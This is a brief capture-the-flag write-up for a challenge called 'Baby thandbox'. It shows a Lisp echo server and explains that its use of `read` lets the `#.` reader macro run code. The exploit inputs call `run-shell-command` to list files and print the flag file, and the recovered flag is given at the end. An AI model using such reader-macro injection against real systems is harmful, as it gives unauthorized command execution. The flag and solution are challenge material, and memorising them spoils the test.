# Baby thandbox

We get access to a server coded in Lisp

```lisp
(defun echo ()
  (princ "> ")
  (setq cmd (read))
    (case cmd
       ('help (princ "Available commands:")(print "help")(print "flag")(print "quit"))
       ('flag (princ "you wish"))
       ('quit (quit))
       (otherwise (prin1 cmd)))
    (terpri)
    (echo))
(handler-case
  (echo)
  (error (e) (prin1 e)(quit)))
(quit)
```

We can research that the `read` function in lisp is *very* vulnerable

https://stackoverflow.com/a/67119074/13273411

http://clhs.lisp.se/Body/02_dhf.htm

We can exploit the `#.` reader macro to get the flag

`#.(run-shell-command "ls")`

`#.(run-shell-command "cat flag_144de66289ad4b9ffa8578cb862c7db7.txt")`

`ecsc23{LISP_is_a_speech_defect_in_which_s_is_pronounced_like_th_in_thick}`